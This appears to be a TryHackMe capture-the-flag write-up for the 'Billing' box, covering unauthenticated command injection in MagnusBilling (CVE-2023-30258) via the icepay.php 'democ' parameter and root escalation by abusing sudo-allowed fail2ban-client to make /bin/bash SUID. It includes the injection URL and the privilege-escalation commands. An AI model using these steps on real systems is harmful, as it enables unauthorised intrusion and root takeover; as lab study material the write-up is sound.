# THM Billing

https://tryhackme.com/room/billing

A Linux box running **MagnusBilling**, exploited through CVE-2023-30258 (unauthenticated command injection in `icepay.php`) for a reverse shell, then rooted by abusing a `sudo`-allowed **`fail2ban-client`** to register a malicious ban action that sets the SUID bit on `/bin/bash`.

We search Google for:

```

```

From here, we get the advisory:

https://eldstal.se/advisories/230327-magnusbilling.html

> **Steps to reproduce** (the following PoC uses a harmless `sleep 30` command as a payload):
> - Visit `/mbilling/lib/icepay/icepay.php?democ=/dev/null;sleep%2030;ls%20a`
> - Observe that the page takes 30 seconds to load
> - Visit `/mbilling/lib/icepay/icepay.php?democ=/dev/null;sleep%203;ls%20a`

### Injecting and triggering the malicious action

The exploit chain: create a new "evil" action, configure its `actionban` to run `chmod +s /bin/bash`, then ban any IP to trigger it:

```
sudo /usr/bin/fail2ban-client set ast-cli-attck addaction evil
sudo /usr/bin/fail2ban-client set ast-cli-attck action evil actionban "chmod +s /bin/bash"
sudo /usr/bin/fail2ban-client set ast-cli-attck banip 1.2.3.5
/bin/bash -p
```

> **Mistake (literal `<jail>`):** the first attempt used the placeholder `<jail>` literally instead of a real jail name, which errored (`bash: jail: No such file or directory`). Replacing `<jail>` with a real jail such as `ast-cli-attck` fixed it.

## Lessons Learned

- **`robots.txt` + a redirect to `/mbilling/` fingerprinted MagnusBilling** immediately, pointing at CVE-2023-30258.
- **Command injection via the `democ` parameter** of `icepay.php` was confirmed with a timing-based `sleep` PoC before weaponising it into a reverse shell. URL-encode the whole payload.
- **`sudo fail2ban-client` is a direct root path.** You can register an arbitrary `actionban` command and trigger it by banning any IP — here used to SUID `/bin/bash`, then `bash -p` for a root EUID shell.
- **Use real jail names, not placeholders.** Running the command with the literal `<jail>` just errors out.
